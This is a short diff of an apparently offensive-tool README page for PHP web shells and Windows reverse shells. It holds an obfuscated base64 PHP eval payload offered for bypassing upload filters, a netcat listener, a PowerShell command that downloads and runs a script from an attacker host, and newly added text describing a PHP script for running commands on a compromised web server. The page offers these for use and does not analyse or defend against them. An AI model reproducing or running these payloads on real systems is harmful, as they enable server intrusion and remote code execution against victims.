@@ -22,7 +22,9 @@
 <h3>Probably can bypass filters while upload, for example.</h3>
  <pre><code>&lt;?=eval(base64_decode('ZWNobyBzaGVsbF91eGVjKCRfR0VUWydjbWQnXS4nIDI+JjEnKTs='));?></code></pre>
 
- <h3 align='center'><b>Commands for Windows Reverse Shell</b></h3>
+<h3 align='center'><b>Commands for Windows Reverse Shell</b></h3>
  <pre><code>python3 -m http.server 80</code></pre>
  <pre><code>nc -lvnp 4444</code></pre>
  <pre><code>powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://&lt;ATTACKER_IP>/reverse.ps1'')"</code></pre>
+<h3 align='center'><b>poc_executable.php</b></h3>
+<p>This PHP script is a simple yet effective utility for situations where you need to execute system commands remotely on a compromised web server. It’s designed to handle specific scenarios where single-line scripts may fail due to various restrictions or server configurations.
